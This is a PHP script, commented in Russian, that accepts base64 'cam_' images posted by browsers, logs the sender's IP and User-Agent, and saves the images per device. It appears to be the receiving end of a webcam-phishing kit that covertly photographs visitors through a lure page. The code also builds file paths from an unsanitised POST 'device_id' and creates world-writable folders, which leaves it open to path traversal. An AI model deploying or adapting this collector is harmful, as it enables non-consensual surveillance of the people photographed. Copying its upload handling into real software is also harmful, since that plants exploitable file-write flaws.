<?php

// Универсальная функция для получения IP адреса
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Получение User-Agent для идентификации устройства
function getUserAgent() {
    return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
}

$date = date('dMYHis');
$imageData = $_POST['cat'];

if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");
}

// Получаем IP или идентификатор устройства
$clientIP = getClientIP();
$userAgent = getUserAgent();

// Создаем уникальный идентификатор (IP или телефон)
// Если есть параметр device_id в POST, используем его, иначе используем IP
$deviceId = isset($_POST['device_id']) ? $_POST['device_id'] : preg_replace('/[^a-zA-Z0-9]/', '_', $clientIP);

// Путь к папке Photo с подпапкой для устройства
// Можно изменить базовую папку здесь, если нужно (по умолчанию: 'Photo')
$basePhotoDir = 'Photo';  // Можно изменить на другую папку при необходимости
$photoDir = $basePhotoDir . '/' . $deviceId . '/';

// Создаем директорию, если она не существует
if (!file_exists($photoDir)) {
    mkdir($photoDir, 0777, true);
}

// Декодируем изображение
$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);

// Сохраняем файл с временной меткой
$filename = $photoDir . 'cam_' . $date . '_' . time() . '.png';
$fp = fopen($filename, 'wb');

if ($fp) {
    fwrite($fp, $unencodedData);
    fclose($fp);
}

exit();
?>

